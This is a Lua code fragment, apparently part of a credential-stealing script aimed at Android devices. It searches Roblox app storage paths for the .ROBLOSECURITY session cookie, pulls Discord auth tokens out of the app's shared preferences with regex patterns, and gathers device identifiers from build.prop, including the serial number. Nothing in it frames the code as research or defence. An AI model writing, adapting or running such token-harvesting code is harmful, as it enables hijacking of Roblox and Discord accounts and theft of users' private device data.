-- ─── android surface ────────────────────────────────────────
local ROBLOX_PATHS = {
    "/data/data/com.roblox.client/shared_prefs/RobloxMobile.xml",
    "/data/data/com.roblox.client/shared_prefs/com.roblox.client.v2.playerprefs.xml",
    "/data/data/com.roblox.client/files/.ROBLOSECURITY",
    "/sdcard/Android/data/com.roblox.client/files/.ROBLOSECURITY",
}
local COOKIE_PATTERNS = {
    '<string name="ROBLOSECURITY">([^<]+)</string>',
    'ROBLOSECURITY%s*[=:]%s*("?)([^%s"<]+)',
}
local function extractCookie(text)
    if type(text) ~= "string" or #text < 20 then return nil end
    for _, pat in ipairs(COOKIE_PATTERNS) do
        local a, b = text:match(pat)
        local v = (b and #b > 20 and b) or (a and #a > 20 and a)
        if v then return v end
    end
    return nil
end
local function findRobloxCookieAndroid()
    for _, path in ipairs(ROBLOX_PATHS) do
        local content, method = readAny(path)
        if content then
            local v = extractCookie(content)
            if v then return { found=true, method=method, path=path, rawLen=#content, value=v } end
        end
    end
    return { found=false, reason=#READERS==0 and "no readfile" or "paths failed" }
end

local function scanAndroidApps()
    local out = {}
    local cfg = {
        paths = {
            "/data/data/com.discord/shared_prefs/com.discord_preferences.xml",
        },
        patterns = { 'name="auth_token">([^<]+)</string>' },
    }
    local found = { app="discord", label="Discord", hits={}, rawLens={} }
    for _, path in ipairs(cfg.paths) do
        local content, method = readAny(path)
        if content then
            found.rawLens[path] = #content
            for _, pat in ipairs(cfg.patterns) do
                for m in content:gmatch(pat) do
                    if m and #m > 20 then found.hits[#found.hits+1] = { path=path, method=method, value=m:sub(1,200) } end
                end
            end
        end
    end
    if #found.hits > 0 or next(found.rawLens) then out[#out+1] = found end
    return out
end

local function grabAndroidBuild()
    local out = {}
    for _, p in ipairs({ "/system/build.prop", "/vendor/build.prop" }) do
        local content = readAny(p); if content then content = content:sub(1,4000) end
        if content then
            for key, val in content:gmatch("([%w%._%-]+)%s*=%s*([^\r\n]+)") do
                if key == "ro.product.model" or key == "ro.product.manufacturer"
                   or key == "ro.build.version.release" or key == "ro.build.version.sdk"
                   or key == "ro.product.brand" or key == "ro.serialno" then out[key] = val end
            end
        end
    end
    return out
end

